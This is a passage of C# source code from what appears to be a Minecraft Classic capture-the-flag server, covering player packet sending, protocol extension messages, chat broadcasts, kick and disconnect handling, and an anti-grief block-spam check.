            HTNO( z ).CopyTo( buffer, 69 );
            buffer[71] = rotx; buffer[72] = roty;
            SendRaw( 7, buffer );
        }
        public void SendPos( byte id, ushort x, ushort y, ushort z, byte rotx, byte roty ) {
            pos = new ushort[3] { x, y, z };
            rot = new byte[2] { rotx, roty };
            byte[] buffer = new byte[9]; buffer[0] = id;
            HTNO( x ).CopyTo( buffer, 1 );
            HTNO( y ).CopyTo( buffer, 3 );
            HTNO( z ).CopyTo( buffer, 5 );
            buffer[7] = rotx; buffer[8] = roty;
            SendRaw( 8, buffer );
        }
        public void SendDie( byte id ) { SendRaw( 0x0C, new byte[1] { id } ); }
        public void SendBlockchange( ushort x, ushort y, ushort z, byte type ) {
            byte[] buffer = new byte[7];
            HTNO( x ).CopyTo( buffer, 0 );
            HTNO( y ).CopyTo( buffer, 2 );
            HTNO( z ).CopyTo( buffer, 4 );
            if ( extension ) {
                buffer[6] = Block.Convert( type );
            } else {
                buffer[6] = Block.Convert( Block.ConvertCPE( type ) );
            }
            SendRaw( 6, buffer );
        }
        void SendKick( string message ) { SendRaw( 14, StringFormat( message, 64 ) ); }
        void SendPing() { /*pingDelay = 0; pingDelayTimer.Start();*/ SendRaw( 1 ); }

        void SendExtInfo( short count ) {
            byte[] buffer = new byte[66];
            StringFormat( "Ctf version: " + Server.Version, 64 ).CopyTo( buffer, 0 );
            HTNO( count ).CopyTo( buffer, 64 );
            SendRaw( 16, buffer );
        }
        void SendExtEntry( string name, short version ) {
            byte[] buffer = new byte[68];
            StringFormat( name, 64 ).CopyTo( buffer, 0 );
            HTNO( version ).CopyTo( buffer, 64 );
            SendRaw( 17, buffer );
        }
        void SendClickDistance( short distance ) {
            byte[] buffer = new byte[2];
            HTNO( distance ).CopyTo( buffer, 0 );
            SendRaw( 18, buffer );
        }
        void SendCustomBlockSupportLevel(byte level) {
            byte[] buffer = new byte[1];
            buffer[0] = level;
            SendRaw( 19, buffer );
        }
        void SendHoldThis( byte type, byte locked ) { // if locked is on 1, then the player can't change their selected block.
            byte[] buffer = new byte[2];
            buffer[0] = type;
            buffer[1] = locked;
            SendRaw( 20, buffer );
        }
        void SendTextHotKey( string label, string command, int keycode, byte mods ) {
            byte[] buffer = new byte[133];
            StringFormat( label, 64 ).CopyTo( buffer, 0 );
            StringFormat( command, 64 ).CopyTo( buffer, 64 );
            BitConverter.GetBytes( keycode ).CopyTo( buffer, 128 );
            buffer[132] = mods;
            SendRaw( 21, buffer );
        }
        public void SendAddPlayerName( byte id, string name, string listname, string groupname, byte grouprank ) {
            byte[] buffer = new byte[195];
            HTNO( (short)id ).CopyTo( buffer, 0 );
            StringFormat( name, 64 ).CopyTo( buffer, 2 );
            StringFormat( listname, 64 ).CopyTo( buffer, 66 );
            StringFormat( groupname, 64 ).CopyTo( buffer, 130 );
            buffer[194] = grouprank;
            SendRaw( 22, buffer );
        }
        public void SendDeletePlayerName( byte id ) {
            byte[] buffer = new byte[2];
            HTNO( (short)id ).CopyTo( buffer, 0 );
            SendRaw( 24, buffer );
        }
        public void SendEnvSetColor( byte type, short r, short g, short b ) {
            byte[] buffer = new byte[7];
            buffer[0] = type;
            HTNO( r ).CopyTo( buffer, 1 );
            HTNO( g ).CopyTo( buffer, 3 );
            HTNO( b ).CopyTo( buffer, 5 );
            SendRaw( 25, buffer );
        }
        public void SendMakeSelection( byte id, string label, short smallx, short smally, short smallz, short bigx, short bigy, short bigz, short r, short g, short b, short opacity ) {
            byte[] buffer = new byte[85];
            buffer[0] = id;
            StringFormat( label, 64 ).CopyTo( buffer, 1 );
            HTNO( smallx ).CopyTo( buffer, 65 );
            HTNO( smally ).CopyTo( buffer,67 );
            HTNO( smallz ).CopyTo( buffer,69 );
            HTNO( bigx ).CopyTo( buffer, 71 );
            HTNO( bigy ).CopyTo( buffer, 73 );
            HTNO( bigz ).CopyTo( buffer, 75 );
            HTNO( r ).CopyTo( buffer, 77 );
            HTNO( g ).CopyTo( buffer, 79);
            HTNO( b ).CopyTo( buffer, 81 );
            HTNO( opacity ).CopyTo( buffer, 83 );
            SendRaw( 26, buffer );
        }
        public void SendDeleteSelection( byte id ) {
            byte[] buffer = new byte[1];
            buffer[0] = id;
            SendRaw( 27, buffer );
        }
        void SendSetBlockPermission( byte type, byte canplace, byte candelete ) {
            byte[] buffer = new byte[3];
            buffer[0] = type;
            buffer[1] = canplace;
            buffer[2] = candelete;
            SendRaw( 28, buffer );
        }
        void SendChangeModel( byte id, string model ) {
            byte[] buffer = new byte[65];
            buffer[0] = id;
            StringFormat( model, 64 ).CopyTo( buffer, 1 );
            SendRaw( 29, buffer );
        }
        void SendSetMapAppearance( string url, byte sideblock, byte edgeblock, short sidelevel ) {
            byte[] buffer = new byte[68];
            StringFormat( url, 64 ).CopyTo( buffer, 0 );
            buffer[64] = sideblock;
            buffer[65] = edgeblock;
            HTNO( sidelevel ).CopyTo( buffer, 66 );
            SendRaw( 30, buffer );
        }
        void SendSetMapWeather( byte weather ) { // 0 - sunny; 1 - raining; 2 - snowing
            byte[] buffer = new byte[1];
            buffer[0] = weather;
            SendRaw( 31, buffer );
        }
        void SendHackControl( byte allowflying, byte allownoclip, byte allowspeeding, byte allowrespawning, byte allowthirdperson, byte allowchangingweather, short maxjumpheight ) {
            byte[] buffer = new byte[7];
            buffer[0] = allowflying;
            buffer[1] = allownoclip;
            buffer[2] = allowspeeding;
            buffer[3] = allowrespawning;
            buffer[4] = allowthirdperson;
            buffer[5] = allowchangingweather;
            HTNO( maxjumpheight ).CopyTo( buffer, 6 );
            SendRaw( 32, buffer );
        }

        void UpdatePosition() {
            byte changed = 0;   //Denotes what has changed (x,y,z, rotation-x, rotation-y)
            // 0 = no change - never happens with this code.
            // 1 = position has changed
            // 2 = rotation has changed
            // 3 = position and rotation have changed
            // 4 = Teleport Required (maybe something to do with spawning)
            // 5 = Teleport Required + position has changed
            // 6 = Teleport Required + rotation has changed
            // 7 = Teleport Required + position and rotation has changed
            //NOTE: Players should NOT be teleporting this often. This is probably causing some problems.
            if ( oldpos[0] != pos[0] || oldpos[1] != pos[1] || oldpos[2] != pos[2] ) {
                changed |= 1;
            }
            if ( oldrot[0] != rot[0] || oldrot[1] != rot[1] ) {
                changed |= 2;
            }
            if ( Math.Abs( pos[0] - basepos[0] ) > 32 || Math.Abs( pos[1] - basepos[1] ) > 32 || Math.Abs( pos[2] - basepos[2] ) > 32 ) {
                changed |= 4;
            }
            if ( ( oldpos[0] == pos[0] && oldpos[1] == pos[1] && oldpos[2] == pos[2] ) && ( basepos[0] != pos[0] || basepos[1] != pos[1] || basepos[2] != pos[2] ) ) {
                changed |= 4;
            }

            byte[] buffer = new byte[0]; byte msg = 0;
            if ( ( changed & 4 ) != 0 ) {
                msg = 8; //Player teleport - used for spawning or moving too fast
                buffer = new byte[9]; buffer[0] = playerID;
                HTNO( pos[0] ).CopyTo( buffer, 1 );
                HTNO( pos[1] ).CopyTo( buffer, 3 );
                HTNO( pos[2] ).CopyTo( buffer, 5 );
                buffer[7] = rot[0]; buffer[8] = rot[1];
            } else if ( changed == 1 ) {
                try {
                    msg = 10; //Position update
                    buffer = new byte[4]; buffer[0] = playerID;
                    Buffer.BlockCopy( System.BitConverter.GetBytes( (sbyte)( pos[0] - oldpos[0] ) ), 0, buffer, 1, 1 );
                    Buffer.BlockCopy( System.BitConverter.GetBytes( (sbyte)( pos[1] - oldpos[1] ) ), 0, buffer, 2, 1 );
                    Buffer.BlockCopy( System.BitConverter.GetBytes( (sbyte)( pos[2] - oldpos[2] ) ), 0, buffer, 3, 1 );
                } catch {

                }
            } else if ( changed == 2 ) {
                msg = 11; //Orientation update
                buffer = new byte[3]; buffer[0] = playerID;
                buffer[1] = rot[0]; buffer[2] = rot[1];
            } else if ( changed == 3 ) {
                try {
                    msg = 9; //Position and orientation update
                    buffer = new byte[6]; buffer[0] = playerID;
                    Buffer.BlockCopy( System.BitConverter.GetBytes( (sbyte)( pos[0] - oldpos[0] ) ), 0, buffer, 1, 1 );
                    Buffer.BlockCopy( System.BitConverter.GetBytes( (sbyte)( pos[1] - oldpos[1] ) ), 0, buffer, 2, 1 );
                    Buffer.BlockCopy( System.BitConverter.GetBytes( (sbyte)( pos[2] - oldpos[2] ) ), 0, buffer, 3, 1 );
                    buffer[4] = rot[0]; buffer[5] = rot[1];
                } catch {

                }
            }

            if ( changed != 0 )
                foreach ( Player p in players ) {
                    if ( p != this && p.level == level ) {
                        p.SendRaw( msg, buffer );
                    }
                }
            oldpos = pos; oldrot = rot;
        }
        #endregion

        #region == GLOBAL MESSAGES ==

        public static void GlobalBlockchange( Level level, ushort x, ushort y, ushort z, byte type ) {
            players.ForEach( delegate( Player p ) { 
                if ( p.level == level ) {
                    byte b = level.GetTile( x, y, z );
                    if ( b != type ) {
                        p.SendBlockchange( x, y, z, type );
                    }
                } 
            } );
        }
        public static void GlobalChat( Player from, string message ) {
            GlobalChat( from, message, true );
        }
        public static void GlobalChat( Player from, string message, bool showname ) {
            if ( from == null ) {
                message = "&8Console&f: " + message;
            } else {
                if ( showname ) {
                    message = from.color + from.name + from.suffix + "&f: " + message;
                }
            }

            players.ForEach( delegate( Player p ) { 
                p.SendMessage( message ); 
            } );
        }
        public static void GlobalChatLevel( Player from, string message, bool showname ) {
            if ( showname ) { message = "<Level>" + from.color + from.name + from.suffix + "&f: " + message; }
            players.ForEach( delegate( Player p ) { if ( p.level == from.level )p.SendMessage( message ); } );
        }
        public static void GlobalChatWorld( Player from, string message, bool showname ) {
            if ( showname ) { message = "<World>" + from.color + from.name + from.suffix + "&f: " + message; }
            players.ForEach( delegate( Player p ) { p.SendMessage( message ); } );
        }
        public static void GlobalMessage( string message ) {
            players.ForEach( delegate( Player p ) { p.SendMessage( message ); } );
        }
        public static void GlobalMessageLevel( Level l, string message ) {
            players.ForEach( delegate( Player p ) { if ( p.level == l ) p.SendMessage( message ); } );
        }
        public static void GlobalMessageOps( string message )     //Send a global messege to ops only
        {
            players.ForEach( delegate( Player p ) {
                if ( p.group.permission >= LevelPermission.Operator ) {
                    p.SendMessage( message );
                }
            } );
        }
        public static void GlobalSpawn( Player from, ushort x, ushort y, ushort z, byte rotx, byte roty, bool self ) {
            players.ForEach( delegate( Player p ) {
                if ( p.Loading && p != from ) { return; }
                if ( p.level != from.level || ( from.hidden && !self ) ) { return; }
                if ( p != from ) { p.SendSpawn( from.playerID, from.color + from.name, x, y, z, rotx, roty ); } else if ( self ) {
                    p.pos = new ushort[3] { x, y, z }; p.rot = new byte[2] { rotx, roty };
                    p.oldpos = p.pos; p.basepos = p.pos; p.oldrot = p.rot;
                    unchecked { p.SendSpawn( (byte)-1, from.color + from.name, x, y, z, rotx, roty ); }
                }
                p.SendAddPlayerName( from.playerID, from.color + from.name, from.name, from.group.color + from.group.name, (byte)from.group.permission );
            } );
        }
        public static void GlobalDie( Player from, bool self ) {
            players.ForEach( delegate( Player p ) {
                if ( p.level != from.level || ( from.hidden && !self ) ) { return; }
                if ( p != from ) { p.SendDie( from.playerID ); p.SendDeletePlayerName( from.playerID ); } else if ( self ) { unchecked { p.SendDie( (byte)-1 ); } }
            } );
        }
        public static void GlobalUpdate() { players.ForEach( delegate( Player p ) { if ( !p.hidden ) { p.UpdatePosition(); } } ); }
        #endregion

        #region == DISCONNECTING ==

        public void Disconnect() {
            if ( disconnected ) {
                if ( connections.Contains( this ) ) {
                    connections.Remove( this );
                }
                return;
            }

            disconnected = true;
            pingTimer.Stop();
            SendKick( "Disconnected." );

            if ( loggedIn ) {
                GlobalDie( this, false );
                if ( !hidden ) { GlobalChat( this, color + name + "&S left the game.", false ); }
                IRCBot.Say( name + " left the game." );
                Server.s.Log( "<-- " + name + " left the game." );
                if ( team != null ) {
                    if ( carryingFlag ) {
                        Command.all.Find( "drop" ).Use( this, "silent" );
                    }
                    team.DelPlayer( this );
                }
                players.Remove( this );
                Server.s.PlayerListUpdate();
                left.Add( this.name.ToLower(), this.ip );
            } else {
                connections.Remove( this );
                Server.s.Log( ip + " disconnected." );
            }

            if ( Server.afkset.Contains( name ) ) {
                Server.afkset.Remove( name );
            }
        }

        public void Kick( string message ) {
            if ( disconnected ) {
                if ( connections.Contains( this ) )
                    connections.Remove( this );
                return;
            }
            disconnected = true;
            pingTimer.Stop();
            SendKick( message );
            if ( loggedIn ) {
                GlobalDie( this, false );
                GlobalChat( this, color + name + "&c was kicked (" + message + ").", false );
                Server.s.Log( name + " kicked (" + message + ")." );
                if ( team != null ) {
                    if ( carryingFlag ) {
                        Command.all.Find( "drop" ).Use( this, "silent" );
                    }
                    team.DelPlayer( this );
                }
                players.Remove( this );
                Server.s.PlayerListUpdate();
                left.Add( this.name.ToLower(), this.ip );
            } else {
                connections.Remove( this );
                Server.s.Log( ip + " kicked (" + message + ")." );
            }
            if ( Server.afkset.Contains( name ) ) {
                Server.afkset.Remove( name );
            }//Removes from afk list on disconnect
        }
        #endregion

        #region == CHECKING ==

        public static List<Player> GetPlayers() {
            return new List<Player>( players );
        }
        public static bool Exists( string name ) {
            foreach ( Player p in players ) { if ( p.name.ToLower() == name.ToLower() ) { return true; } } return false;
        }
        public static bool Exists( byte id ) {
            foreach ( Player p in players ) { if ( p.playerID == id ) { return true; } } return false;
        }
        public static Player Find( string name ) {
            foreach ( Player p in players ) { if ( p.name.ToLower() == name.ToLower() ) { return p; } } return null;
        }
        public static Group GetGroup( string name ) {
            return Group.FindPlayer( name );
        }
        public static string GetColor( string name ) {
            return GetGroup( name ).color;
        }
        #endregion

        #region == OTHER ==

        static byte FreeId() {
            for ( byte i = 0; i < Server.players; ++i ) {
                foreach ( Player p in players ) {
                    if ( p.playerID == i ) { goto Next; }
                } return i;
            Next: continue;
            } unchecked { return (byte)-1; }
        }
        static byte[] StringFormat( string str, int size ) {
            byte[] bytes = new byte[size];
            bytes = enc.GetBytes( str.PadRight( size ).Substring( 0, size ) );
            return bytes;
        }
        public static List<string> WordWrap( string message ) {
            List<string> lines = new List<string>();
            string validColorChars = "0123456789abcdef";
            string lastColor = "";

            message = message.Trim();

            for ( int i = 0; i < message.Length; i++ ) {
                char thisChar = message[i];
                if ( thisChar == '&' ) {
                    try {
                        if ( message[i + 2] == '&' ) {
                            message = message.Remove( i, 2 );
                            i = i - 1;
                        }
                    } catch { }
                }
            }

        next:

            if ( message.Length <= 64 ) {
                lines.Add( message );
                return lines;
            }

            try {
                for ( int i = 0; i <= 64; i++ ) {
                    if ( message[i] == '&' && validColorChars.Contains( message[i + 1].ToString() ) ) {
                        lastColor = message.Substring( i, 2 );
                    }

                    if ( i == 64 ) {
                        if ( message[i] == ' ' ) {
                            lines.Add( message.Substring( 0, 64 ) );
                            message = ">" + lastColor + " " + message.Remove( 0, 64 ).Trim();
                        } else {
                            int breakIndex = message.Substring( 0, 64 ).LastIndexOf( ' ' );
                            lines.Add( message.Substring( 0, breakIndex ) );
                            message = ">" + lastColor + " " + message.Remove( 0, breakIndex ).Trim();
                        }
                    }
                }
            } catch {
                Server.s.Log( "Error!" );
            }

            goto next;
        }
        public static bool ValidName( string name ) {
            string allowedchars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567890._@";
            foreach ( char ch in name ) { if ( allowedchars.IndexOf( ch ) == -1 ) { return false; } } return true;
        }
        public static byte[] GZip( byte[] bytes ) {
            System.IO.MemoryStream ms = new System.IO.MemoryStream();
            GZipStream gs = new GZipStream( ms, CompressionMode.Compress, true );
            gs.Write( bytes, 0, bytes.Length );
            gs.Close();
            ms.Position = 0;
            bytes = new byte[ms.Length];
            ms.Read( bytes, 0, (int)ms.Length );
            ms.Close();
            return bytes;
        }
        #endregion

        #region == Host <> Network ==

        byte[] HTNO( ushort x ) {
            byte[] y = BitConverter.GetBytes( x ); Array.Reverse( y ); return y;
        }
        ushort NTHO( byte[] x, int offset ) {
            byte[] y = new byte[2];
            Buffer.BlockCopy( x, offset, y, 0, 2 ); Array.Reverse( y );
            return BitConverter.ToUInt16( y, 0 );
        }
        byte[] HTNO( short x ) {
            byte[] y = BitConverter.GetBytes( x ); Array.Reverse( y ); return y;
        }
        #endregion

        bool CheckBlockSpam() {
            if ( spamBlockLog.Count >= spamBlockCount ) {
                DateTime oldestTime = spamBlockLog.Dequeue();
                double spamTimer = DateTime.Now.Subtract( oldestTime ).TotalSeconds;
                if ( spamTimer < spamBlockTimer ) {
                    this.Kick( "You were kicked by antigrief system. Slow down." );
                    SendMessage( Colour.red + name + " was kicked for suspected griefing." );
                    Server.s.Log( name + " was kicked for block spam (" + spamBlockCount + " blocks in " + spamTimer + " seconds)" );
                    return true;
                }
            }
            spamBlockLog.Enqueue( DateTime.Now );
            return false;
        }
    }
}